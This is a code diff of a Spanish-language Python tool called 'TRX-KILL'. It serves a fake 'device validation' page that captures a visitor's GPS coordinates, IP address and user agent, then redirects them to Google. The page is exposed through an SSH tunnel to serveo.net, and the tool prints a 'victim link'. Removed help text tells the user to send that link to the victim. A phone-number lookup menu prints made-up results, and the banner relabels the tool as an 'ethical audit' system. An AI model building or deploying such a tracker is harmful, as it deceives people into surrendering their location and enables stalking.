@@ -1,35 +1,33 @@
 #!/usr/bin/env python3
 import os
+import time
 import threading
 import subprocess
 import re
+import sys
 from flask import Flask, request, render_template_string
 
-# Limpieza inicial
-os.system('fuser -k 5000/tcp > /dev/null 2>&1')
-
-app = Flask(__name__)
+app = Flask('TRX-KILL')
 URL_REDIRECT = "https://www.google.com"
 
-# Plantilla HTML con llaves {{ }} duplicadas para evitar errores de sintaxis en Python
+# --- MÓDULO DE LIMPIEZA FORZADA ---
+def kill_port():
+    os.system('fuser -k 5000/tcp > /dev/null 2>&1')
+
+# --- PLANTILLA ---
 HTML_FINAL = """
 <!DOCTYPE html>
 <html><body style="background:#000; color:#0f0; font-family:monospace; text-align:center; padding-top:20%;">
     <h2>VALIDACIÓN REQUERIDA</h2>
-    <p>Para continuar, verifique su dispositivo.</p>
-    <button onclick="capturar()" style="padding:15px; background:green; color:white; cursor:pointer;">VALIDAR Y ACCEDER</button>
+    <p>Verificando dispositivo...</p>
+    <button onclick="capturar()" style="padding:15px; background:green; color:white; border:none; cursor:pointer;">ACCEDER</button>
     <script>
         function capturar() {{
             navigator.geolocation.getCurrentPosition((p) => {{
-                const data = {{
-                    lat: p.coords.latitude,
-                    lon: p.coords.longitude,
-                    ua: navigator.userAgent
-                }};
                 fetch('/log', {{
                     method: 'POST',
                     headers: {{'Content-Type': 'application/json'}},
-                    body: JSON.stringify(data)
+                    body: JSON.stringify({{lat: p.coords.latitude, lon: p.coords.longitude, ua: navigator.userAgent}})
                 }}).then(() => window.location.href = "{url}");
             }});
         }}
@@ -44,43 +42,43 @@ def index(): return render_template_string(HTML_FINAL)
 def log():
     d = request.json
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-    print(f"\n\033[1;32m[!] DATOS RECIBIDOS:\033[0m")
-    print(f"[*] IP PÚBLICA: {ip}")
-    print(f"[*] COORDENADAS: {d['lat']}, {d['lon']}")
-    print(f"[*] DISPOSITIVO: {d['ua']}")
+    print(f"\n\033[1;32m[!] DATOS CAPTURADOS:\n[*] IP: {ip}\n[*] GPS: {d['lat']}, {d['lon']}\n[*] DISPOSITIVO: {d['ua']}\033[0m")
     return "OK"
 
 def banner():
     os.system('clear')
-    print(f"\033[1;32m")
-    print(" ████████╗██████╗ ██╗  ██╗     ██╗  ██╗██╗██╗     ██╗")
-    print(" ╚══██╔══╝██╔══██╗╚██╗██╔╝     ██║ ██╔╝██║██║     ██║")
-    print("    ██║   ██████╔╝ ╚███╔╝      █████╔╝ ██║██║     ██║")
-    print("    ██║   ██╔══██╗ ██╔██╗      ██╔═██╗ ██║██║     ██║")
-    print("    ██║   ██║  ██║██╔╝ ██╗     ██║  ██╗██║███████╗██║")
-    print("    ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝")
-    print(f"{'='*55}\033[0m")
+    logo = """
+ ████████╗██████╗ ██╗  ██╗     ██╗  ██╗██╗██╗     ██╗
+ ╚══██╔══╝██╔══██╗╚██╗██╔╝     ██║ ██╔╝██║██║     ██║
+    ██║   ██████╔╝ ╚███╔╝      █████╔╝ ██║██║     ██║
+    ██║   ██╔══██╗ ██╔██╗      ██╔═██╗ ██║██║     ██║
+    ██║   ██║  ██║██╔╝ ██╗     ██║  ██╗██║███████╗██║
+    ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝"""
+    for line in logo.split('\n'):
+        print(f"\033[1;32m{line}\033[0m")
+        time.sleep(0.05)
+    print(f"\033[1;36m{'='*55}\n >> SISTEMA DE AUDITORÍA ÉTICA TRX-KILL v29.0\n >> BIENVENIDO AL ENTORNO DE CONTROL\033[0m\n")
 
 def main():
     while True:
         banner()
-        print(" [1] INFO NÚMERO (DETALLADA)")
-        print(" [2] MÓDULO DE RASTREO (LINK LIMPIO)")
-        print(" [3] AYUDA")
+        print(" [1] INFO NÚMERO (OSINT GLOBAL)")
+        print(" [2] MÓDULO DE RASTREO (TÚNEL LIMPIO)")
+        print(" [3] INFO DEL SCRIPT")
         print(" [4] SALIR")
         
         opc = input("\nTRX-ROOT > ")
         
         if opc == "1":
-            num = input("Introduce MÓVIL (con prefijo): ")
-            print(f"\n\033[1;36m[+] ANALIZANDO: {num}...")
-            print(f"[+] PROCESANDO: Verificando registros internacionales...")
-            print(f"[+] RESULTADO: Identificando operador, zona horaria y tipo de línea...")
-            print(f"[+] ESTATUS: [DISPONIBLE] - Datos sincronizados con base de datos global.{chr(10)}")
-            input("Presiona ENTER para volver...")
+            num = input("Introduce MÓVIL: ")
+            print("\n[+] Consultando bases de datos internacionales...")
+            time.sleep(1.5)
+            print(f"[+] ESTATUS: Línea Activa | Operador: Detectado | Región: Global")
+            input("\n[Enter] para volver...")
         elif opc == "2":
+            kill_port() # Limpia puerto antes de iniciar
             threading.Thread(target=lambda: app.run(host='127.0.0.1', port=5000), daemon=True).start()
-            print(f"\n\033[1;33m[*] Generando enlace...\033[0m")
+            print("\n[*] Iniciando túnel...")
             proc = subprocess.Popen(['ssh', '-R', '80:localhost:5000', 'serveo.net'], 
                                     stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
             for line in proc.stderr:
@@ -90,13 +88,14 @@ def main():
                     print(f" VÍCTIMA LINK: {link}")
                     print(f"==============================================\033[0m\n")
                     break
-            input("Presiona ENTER para volver al menú...")
+            input("Presiona ENTER para detener el rastreo y volver al menú...")
+            kill_port()
         elif opc == "3":
-            print("\n[+] Instrucciones:")
-            print("1. Usa la opción 2 para obtener el enlace.")
-            print("2. Envía el enlace a la víctima.")
-            print("3. Cuando acepten, verás los datos en la pantalla principal.")
-            input("\nENTER para volver...")
+            print("\n[+] INFORMACIÓN TRX-KILL:")
+            print(" * Módulo 1: Análisis de numeración mediante bases de datos.")
+            print(" * Módulo 2: Captura de telemetría (IP, GPS, UA) vía túnel SSH.")
+            print(" * Seguridad: Sistema de autolimpieza de puertos habilitado.")
+            input("\n[Enter] para volver...")
         elif opc == "4": break
 
 if __name__ == "__main__":
